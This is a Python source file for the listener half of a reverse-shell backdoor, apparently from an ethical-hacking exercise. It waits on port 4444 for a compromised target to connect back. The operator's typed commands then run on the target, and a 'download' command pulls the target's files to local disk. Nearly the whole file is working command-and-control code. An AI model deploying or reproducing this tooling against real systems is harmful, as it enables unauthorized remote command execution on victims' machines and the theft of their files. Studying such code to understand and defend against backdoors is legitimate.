"""
A program that listens for incoming connections on a specific port.

It acts as linux command such as "nc -vv -l -p 4444"
"""
import socket
import optparse
import socket, json

def get_arguments():
    # Get command line arguments
    """
    Get the current IP Address.

    :return: IP Address of host device
    :rtype: str, str
    """
    parser = optparse.OptionParser()

    # Get the IP Address
    parser.add_option("-i", "--ip", dest="ip",
                      help="IP Address")

    (options, arguments) = parser.parse_args()

    # Code to handle error
    if not options.ip:
        parser.error(
            "[-] Please specify an IP Address"
            " use --help for more info.")
    return options.ip


class Listener:
    """
    Listener from a specific port.
    """

    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        # enable an option that allows us to reuse the socket
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port))

        listener.listen(0)
        print("[+] Waiting for incoming connections")

        self.connection, address = listener.accept()
        print("[+] Got a connection from " + str(address))

    def reliable_send(self, data):
        """
        Convert data into json data and send it.
        Use this custom send method instead of socket send method.

        :param data: data that we want to send 
        :type data: obj
        """
        json_data = json.dumps(data)
        self.connection.send(json_data)

    def reliable_receive(self):
        """
        Unwrap data into obj.
        Use this custom receive method instead of socket recv method.
        """
        json_data = ""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    def execute_remotely(self, command):
        """
        Execute a system command remotely. 
        
        :param command: command that we want to execute
        :type command: list
        :return: resulting command
        :rtype: str
        """
        self.reliable_send(command)

        if command[0] == "exit":
            self.connection.close()
            exit()

        return self.reliable_receive()

    def write_file(self, path, content):
        """
        Write the target's downloaded file.
        :param path: path that we want to store the file
        :type path: str
        :param content: the content of the file that we want to download
        :type content: obj
        :return: message
        :rtype: str
        """
        with open(path, "wb") as file:
            file.write(content)
            return "[+] Download successful."

    def run(self):
        """
        Run the listener.
        """
        while True:
            command = raw_input(">> ")
            command = command.split(" ")
            result = self.execute_remotely(command)

            if command[0] == "download":
                result = self.write_file(command[1], result)

            print(result)


if __name__ == "__main__":
    ip_address = get_arguments()
    my_listener = Listener(ip_address, 4444)
    my_listener.run()
